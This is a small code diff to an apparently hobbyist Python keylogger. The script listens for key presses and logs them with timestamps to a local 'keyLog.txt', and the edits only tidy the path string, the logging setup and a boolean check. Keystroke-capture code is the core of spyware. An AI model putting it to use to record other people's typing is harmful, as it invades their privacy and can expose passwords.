@@ -5,8 +5,10 @@ import os
 
 currently_active = True
 # log_dir = r"C:/Users/Q1045698/Documents/python_keystrokes/"
-filename = os.getcwd() + "\keyLog.txt"
-logging.basicConfig(filename=filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+filename = os.getcwd() + r"/keyLog.txt"
+logging.basicConfig(filename=filename,
+                    level=logging.DEBUG,
+                    format='%(asctime)s: %(message)s')
 
 
 def on_press(key):
@@ -23,5 +25,5 @@ def on_press(key):
 
 with Listener(on_press=on_press) as listener:
     # print(currently_active)
-    if(currently_active == True):
+    if currently_active:
         listener.join()
